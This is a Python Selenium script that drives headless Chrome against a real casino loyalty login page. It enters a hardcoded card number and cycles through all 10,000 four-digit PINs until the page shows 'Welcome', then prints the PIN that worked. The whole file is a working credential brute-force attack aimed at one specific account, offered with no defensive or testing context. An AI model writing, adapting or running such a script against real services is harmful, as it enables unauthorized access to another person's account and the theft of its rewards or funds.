from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
import time

card_number = "105369918"

options = Options()
options.add_argument("--headless")
options.add_argument("--disable-gpu")
options.add_argument("--no-sandbox")
options.add_argument("--disable-dev-shm-usage")

driver = webdriver.Chrome(options=options)
driver.get("https://nuggetsparks.joingo.com/?sceneId=222931")

for i in range(10000):
    pin = f"{i:04d}"
    try:
        driver.find_element(By.ID, "cardNumber").clear()
        driver.find_element(By.ID, "cardNumber").send_keys(card_number)

        driver.find_element(By.ID, "pin").clear()
        driver.find_element(By.ID, "pin").send_keys(pin)

        driver.find_element(By.ID, "loginButton").click()
        time.sleep(2)

        if "Welcome" in driver.page_source:
            print(f"Success! PIN: {pin}")
            break
        else:
            print(f"Attempt {pin} failed")

    except Exception as e:
        print(f"Error on PIN {pin}: {e}")

driver.quit()